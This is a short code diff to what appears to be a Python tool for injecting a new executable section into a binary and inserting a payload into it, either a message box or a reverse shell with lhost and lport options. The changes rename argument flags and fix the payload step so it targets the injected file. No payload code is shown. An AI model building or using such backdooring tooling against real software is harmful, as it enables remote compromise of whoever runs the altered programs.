@@ -41,7 +41,7 @@ parser.add_argument('-sS',
                     help='size for section to be injected',
                     default=0x1000)
 
-parser.add_argument('-sP',
+parser.add_argument('-pS',
                     '--page_size',
                     type=int,
                     metavar='size',
@@ -56,14 +56,14 @@ parser.add_argument('-t',
                     choices=['msg', 'rev'],
                     help='size for section to be injected')
 
-parser.add_argument('-pS',
+parser.add_argument('-sP',
                     '--section_permissions',
                     type=int,
                     metavar='permissions',
                     help='permissions for section to be injected',
                     default=0xE0000000)
 
-parser.add_argument('-nS',
+parser.add_argument('-sN',
                     '--section_name',
                     type=str,
                     metavar='name',
@@ -83,7 +83,7 @@ injected_path = section_injection.add_section(args.path,
 print("Injecting payload...")
 # insert_payload can take lhost and lport for rev
 payload_injection.insert_payload(
-    original_path=args.path,
+    original_path=injected_path,
     payload=args.type,
     lhost=args.lhost,
     lport=args.lport)
